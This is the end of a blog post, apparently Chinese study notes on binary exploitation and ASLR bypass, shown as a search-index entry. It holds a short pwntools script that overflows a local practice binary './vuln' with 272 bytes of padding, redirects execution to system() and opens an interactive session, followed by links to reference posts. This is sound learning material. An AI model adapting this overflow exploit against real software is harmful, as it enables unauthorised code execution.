<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">system = <span class="number">0x1050</span></span><br><span class="line">exit = <span class="number">0x1060</span></span><br><span class="line">system_arg = <span class="number">0x559e0dd67004</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span> * <span class="number">272</span>+p32(system)+p32(exit)+p32(system_arg)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">io= process(argv=[<span class="string">&#x27;./vuln&#x27;</span>, payload])</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>[1] <a href="https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/">绕过ASLR-一</a></p>
<p>[2] <a href="https://lantern.cool/note-pwn-linux-protect/index.html">Linux常用保护机制</a></p>
<p>[3] <a href="https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">Pwn学习笔记2-内存布局</a></p>
<p>[4] <a href="https://diting0x.github.io/20170101/bypassaslr-returntoplt/">bypassaslr-returntoplt</a></p>
]]></content>
      <categories>
        <category>二进制学习笔记</category>
      </categories>
      <tags>
        <tag>二进制学习笔记</tag>
      </tags>
  </entry>
</search>
